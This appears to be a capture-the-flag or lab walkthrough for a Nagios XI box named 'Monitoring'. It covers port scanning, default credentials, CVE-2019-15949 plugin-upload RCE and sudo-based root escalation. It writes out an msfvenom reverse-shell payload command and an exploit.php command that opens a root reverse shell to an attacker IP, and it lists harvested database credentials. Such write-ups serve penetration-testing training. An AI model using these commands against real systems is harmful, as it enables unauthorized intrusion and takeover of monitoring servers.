# Monitoring: Machine Notes

## Recon

### Nmap
- Port 22/tcp: SSH (OpenSSH 7.2p2)
- Port 25/tcp: SMTP (Postfix)
- Port 80/tcp: HTTP (Nagios XI)
- Port 389/tcp: LDAP (OpenLDAP)
- Port 443/tcp: HTTPS (Nagios XI)
- Port 5667/tcp: tcpwrapped

### Web Enumeration
- Application: Nagios XI
- Port: 80, 443
- Directory Discovery:
  - `/nagios/` (Requires Auth)
  - `/nagiosxi/` (Main Interface)
- Default Credentials Found: `nagiosadmin` : `admin`

## Initial Access

### Nagios XI Authenticated RCE (CVE-2019-15949)
- Nagios XI allows authenticated users to upload plugins.
- Malicious ELF file can be uploaded as a plugin and executed.
- **Payload Generation**:
  ```bash
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4444 -f elf -o check_icmp
  ```
- **Exploitation**:
  1. Login to Nagios XI.
  2. Navigate to `Admin` -> `Manage Plugins`.
  3. Upload the malicious `check_icmp` file.
  4. Trigger the plugin to receive a reverse shell as the `nagios` user.

## Privilege Escalation

### Sudo Privileges
- `sudo -l` shows extensive NOPASSWD entries:
  - `/etc/init.d/nagios *`
  - `/usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php`
  - `/usr/local/nagiosxi/scripts/upgrade_to_latest.sh`
  - `/usr/local/nagiosxi/scripts/backup_xi.sh`

### Nagios XI Root RCE
- Exploited using a PHP script targeting Nagios XI misconfigurations.
- **Command**:
  ```bash
  php exploit.php --host=192.168.171.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.233 --reverseport=8001
  ```
- Result: Root access.

## Post-Exploitation / Credentials
- Database Config: `lock_file=/usr/local/nagios/var/ndo2db.lock`
- DB User: `ndoutils`
- DB Pass: `n@gweb`
- DB Name: `nagios`
